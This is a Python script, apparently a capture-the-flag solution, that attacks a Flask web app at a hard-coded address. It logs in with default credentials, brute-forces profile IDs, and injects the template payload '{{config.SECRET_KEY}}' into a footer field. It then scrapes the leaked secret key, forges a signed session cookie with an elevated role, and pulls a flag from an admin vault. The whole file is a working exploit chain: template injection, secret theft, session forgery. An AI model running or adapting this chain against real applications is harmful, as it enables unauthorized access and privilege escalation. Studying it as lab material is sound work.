import re
import sys

import requests
from flask import Flask
from flask.sessions import SecureCookieSessionInterface


BASE_URL = "http://47.99.147.34:16610"
LOGIN_DATA = {"username": "admin", "password": "123456"}
SSTI_PAYLOAD = "{{config.SECRET_KEY}}"
MAX_PROFILE_ID = 300


def build_signed_cookie(secret_key: str) -> str:
    app = Flask(__name__)
    app.secret_key = secret_key
    serializer = SecureCookieSessionInterface().get_signing_serializer(app)
    if serializer is None:
        raise RuntimeError("failed to build Flask session serializer")
    return serializer.dumps({"role": "tax_inspector", "user_id": 1})


def extract_footer_secret(html: str) -> str:
    match = re.search(
        r'italic text-center">\s*([^<]+?)\s*</div>',
        html,
        re.S,
    )
    if not match:
        raise RuntimeError("failed to extract leaked SECRET_KEY from preview page")
    return match.group(1).strip()


def extract_flag(html: str) -> str:
    match = re.search(r"flag\{[^}]+\}", html)
    if not match:
        raise RuntimeError("failed to extract flag from admin vault")
    return match.group(0)


def find_working_profile(session: requests.Session) -> int:
    for profile_id in range(1, MAX_PROFILE_ID + 1):
        import_resp = session.post(
            f"{BASE_URL}/api/import",
            json={
                "profile_id": profile_id,
                "data": {
                    "state": "AUDIT_PENDING",
                    "custom_footer": SSTI_PAYLOAD,
                },
            },
            timeout=15,
        )
        if import_resp.status_code != 200:
            continue

        preview_resp = session.get(f"{BASE_URL}/preview/{profile_id}", timeout=15)
        if preview_resp.status_code != 200:
            continue

        if SSTI_PAYLOAD not in preview_resp.text:
            return profile_id

    raise RuntimeError("failed to find a usable profile_id")


def main() -> int:
    session = requests.Session()

    login_resp = session.post(
        f"{BASE_URL}/login",
        data=LOGIN_DATA,
        allow_redirects=False,
        timeout=15,
    )
    if login_resp.status_code != 302:
        raise RuntimeError(f"login failed: {login_resp.status_code}")

    profile_id = find_working_profile(session)
    preview_resp = session.get(f"{BASE_URL}/preview/{profile_id}", timeout=15)
    secret_key = extract_footer_secret(preview_resp.text)
    forged_cookie = build_signed_cookie(secret_key)

    vault_resp = requests.get(
        f"{BASE_URL}/admin/vault",
        cookies={"session": forged_cookie},
        timeout=15,
    )
    if vault_resp.status_code != 200:
        raise RuntimeError(f"vault access failed: {vault_resp.status_code}")

    flag = extract_flag(vault_resp.text)
    print(f"PROFILE_ID: {profile_id}")
    print(f"SECRET_KEY: {secret_key}")
    print(f"FLAG: {flag}")
    return 0


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except Exception as exc:
        print(f"[-] {exc}", file=sys.stderr)
        raise SystemExit(1)
